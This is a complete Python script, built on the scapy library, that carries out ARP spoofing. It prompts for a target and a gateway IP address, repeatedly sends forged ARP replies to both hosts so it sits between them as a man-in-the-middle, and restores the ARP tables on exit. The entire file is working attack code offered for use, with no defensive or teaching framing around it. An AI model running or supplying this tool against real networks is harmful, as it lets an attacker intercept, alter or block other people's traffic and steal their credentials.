#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    # Craft an ARP request packet to get the MAC address associated with the provided IP address
    arp_request = scapy.ARP(pdst=ip)
    # Craft an Ethernet frame to broadcast the ARP request packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine the Ethernet frame and ARP request packet
    arp_request_broadcast = broadcast/arp_request
    # Send the combined packet and receive the response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # Extract and return the MAC address from the response if available, otherwise return None
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    # Get the MAC address of the target machine
    target_mac = get_mac(target_ip)
    # If MAC address is found
    if target_mac:
        # Craft an ARP response packet to spoof the target machine's ARP table
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        # Send the spoofed packet
        scapy.send(packet, verbose=False)
    else:
        print(f"[-] Failed to get target MAC address for {target_ip}")

def restore(destination_ip, source_ip):
    # Get the MAC addresses of the destination and source IPs
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # If MAC addresses are found
    if destination_mac and source_mac:
        # Craft an ARP response packet to restore the ARP tables
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        # Send the packet multiple times to ensure ARP table restoration
        scapy.send(packet, count=4, verbose=False)
    else:
        print(f"[-] Failed to get MAC address for {destination_ip} or {source_ip}")

def main():
    # Prompt the user to input the target and gateway IP addresses
    target_ip = input("Enter the target IP: ")
    gateway_ip = input("Enter the gateway IP: ")

    try:
        packets_sent_count = 0
        # Continuously spoof ARP packets between the target and the gateway
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            packets_sent_count += 2
            print(f"\r[+] Packets Sent: {packets_sent_count}", end="")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        # Upon detecting Ctrl + C, stop the ARP spoofing attack and restore ARP tables
        print("\n[+] Detected Ctrl + C ....... Quitting. ")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

if __name__ == "__main__":
    main()
